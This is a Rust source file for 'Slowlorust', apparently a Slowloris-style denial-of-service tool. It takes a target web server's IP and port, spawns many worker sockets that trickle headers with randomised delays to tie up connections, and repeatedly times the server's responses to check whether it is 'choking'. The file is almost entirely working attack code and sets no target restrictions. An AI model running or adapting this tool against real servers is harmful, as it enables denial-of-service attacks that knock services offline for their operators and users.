mod worker;

use clap::Parser;
use scoped_threadpool::Pool;
use std::cmp;
use std::io::{Error, Read, Write};
use std::net::TcpStream;
use std::thread::sleep;
use std::time::{Duration, Instant};
use worker::Worker;
#[macro_use]
extern crate log;

#[derive(Parser)]
#[clap(version = "1.0", author = "Michael Van Leeuwen <michaeljvanleeuwen at gmail.com>")]
struct Slowlorust {
    /// The IP address of the webserver
    ip: String,
    /// The port the webserver is running on
    port: String,
    /// How many worker sockets to open
    #[clap(short, long, default_value = "50")]
    worker_count: u16,
    /// How many headers to send before restarting a worker
    #[clap(short, long, default_value = "10")]
    header_count: u8,
    /// Lower bound of request delay in seconds
    #[clap(short, long, default_value = "0")]
    lower_sleep: u8,
    /// Upper bound of request delay in seconds
    #[clap(short, long, default_value = "15")]
    upper_sleep: u8,
    /// How many seconds to wait between each connection benchmark
    #[clap(short, long, default_value = "15")]
    benchmark_delay: u8,
    /// How many seconds to wait before the server is "down"
    #[clap(short, long, default_value = "5")]
    timeout: u8,
    /// Log actions of each worker
    #[clap(short, long, parse(from_occurrences))]
    verbose: i32,
}

fn benchmark_connection(conn_str: &str, timeout: u8) -> Result<Duration, Error> {
    let now = Instant::now();
    let mut stream = TcpStream::connect(&conn_str)?;
    stream.write_all("GET / HTTP/1.1\r\n\r\n".as_bytes())?;
    let mut buffer = Vec::new();
    stream.set_read_timeout(Some(Duration::from_secs(timeout as u64)))?;
    stream.read_to_end(&mut buffer)?;
    Ok(now.elapsed())
}

fn main() {
    let args = Slowlorust::parse();
    colog::init();

    if args.lower_sleep >= args.upper_sleep {
        error!("sleep_min must be < sleep_max.");
        panic!();
    }

    let conn_str = format!("{}:{}", args.ip, args.port);
    if let Ok(dur) = benchmark_connection(&conn_str, args.timeout) {
        info!("Server is up. Connected in {}s ({} ns).", dur.as_secs(), dur.as_nanos());
    } else {
        error!("Connection failed. Is the server up?");
        panic!();
    }

    info!("Starting workers...");
    let mut pool = Pool::new(args.worker_count as u32);
    let mut num_workers = 0;
    pool.scoped(|scoped| {
        while num_workers < args.worker_count {
            if let Ok(mut worker) = Worker::new(
                num_workers,
                conn_str.clone(),
                args.header_count,
                (args.lower_sleep, args.upper_sleep),
                args.verbose,
            ) {
                if args.verbose > 0 {
                    info!("[slowlorust_{:03}] Spawned.", num_workers);
                }
                scoped.execute(move || {
                    worker.start();
                });
                num_workers += 1;
                if args.verbose == 0 && num_workers % cmp::max(args.worker_count / 5, 1) == 0 {
                    println!(" | \t{:03} workers spawned.", num_workers);
                }
            }
        }
        info!("All workers spawned!");

        info!("Starting connection benchmarking...");
        loop {
            match benchmark_connection(&conn_str, args.timeout) {
                Ok(dur) => info!("Server response in {}s ({} ns).", dur.as_secs(), dur.as_nanos()),
                Err(_) => warn!("Failed to benchmark. Is the server choking?"),
            }
            sleep(Duration::from_secs(args.benchmark_delay as u64));
        }
    });
}
